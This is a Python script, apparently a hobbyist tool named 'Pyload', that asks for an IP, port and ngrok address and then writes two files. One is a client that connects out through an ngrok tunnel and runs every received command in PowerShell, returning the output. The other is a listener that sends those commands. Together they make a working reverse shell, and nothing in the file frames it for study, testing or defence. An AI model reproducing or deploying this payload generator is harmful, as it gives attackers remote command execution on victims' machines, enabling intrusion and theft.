from colorama import Fore
from pyngrok import ngrok
import subprocess
import os

def pyload():
    os.system("cls")
    print(Fore.RED + 'IP="" ;|; PORT=""')
    print(Fore.YELLOW + '\nURL_NGROK="" ,|, PORT_NGROK=""')
    ip = input(Fore.BLUE + "\nIP: ")
    port = input(Fore.BLUE + "\nPORT: ")
    ngrok_url = input(Fore.CYAN + "\nURL NGROK = ")
    ngrok_port = input(Fore.CYAN + "\nPORT_NGROK = ")
    input(Fore.GREEN + "\nEnter To Create ...")
    with open("client.py", "w") as c:
        c.write('''
import subprocess
from socket import *

client = socket(AF_INET, SOCK_STREAM)

client.connect(("'''+ngrok_url+'''", '''+ngrok_port+'''))

while True:
    try:
        command = client.recv(100).decode()
        cmd = subprocess.getoutput("powershell "+command)
        client.send(cmd.encode())
        
    except:
        client.send(b"____E_R_R_O_R_____")

client.close()
        ''')

    with open("server.py", "w") as s:
        s.write('''
from colorama import Fore
from socket import *
import os

os.system("cls")
print(Fore.YELLOW + "Listener ...")

server = socket(AF_INET, SOCK_STREAM)

server.bind(("'''+ip+'''", '''+port+'''))
server.listen(1)

client, address = server.accept()
print(Fore.RED + client)

while True:
    try:
        data = input(Fore.BLUE + "$_ ")
        if data == "":
            print(Fore.RED + "____E_R_R_O_R_____")
        else:
            client.send(data.encode())
            msg_r = client.recv(10000).decode()
            if msg_r == "":
                print(Fore.GREEN + "_____U N D I F U N E _____")
            else:
                print(Fore.CYAN + msg_r)
    except:
         print(Fore.RED + "____E_R_R_O_R_____")

client.close()''')

    print(Fore.GREEN + "\nOk. Create Pyload Sacssesfuly ( File server.py ) , ( File client.py )!")
        
def banner():
    os.system("cls")
    print(Fore.RED + """
     _______             __                            __ 
    |       \           |  \                          |  \\
    | $$$$$$$\ __    __ | $$  ______    ______    ____| $$
    | $$__/ $$|  \  |  \| $$ /      \  |      \  /      $$
    | $$    $$| $$  | $$| $$|  $$$$$$\  \$$$$$$\|  $$$$$$$
    | $$$$$$$ | $$  | $$| $$| $$  | $$ /      $$| $$  | $$
    | $$      | $$__/ $$| $$| $$__/ $$|  $$$$$$$| $$__| $$
    | $$       \$$    $$| $$ \$$    $$ \$$    $$ \$$    $$
    \$$       _\$$$$$$$ \$$  \$$$$$$   \$$$$$$$  \$$$$$$$
             |  \__| $$                                  
              \$$    $$                                  
               \$$$$$$                                   
    """)
    print(Fore.GREEN + "\n1. Create Pyload!\n0. Exit()")
    while True:
        what_number = input(Fore.CYAN + "\n\t$_[/] :>> ")
        if what_number == "1":
            pyload()
        elif what_number == "0":
            exit(Fore.YELLOW + "\n...")
        else:
            print(Fore.YELLOW + "\nWhat?")
    

banner()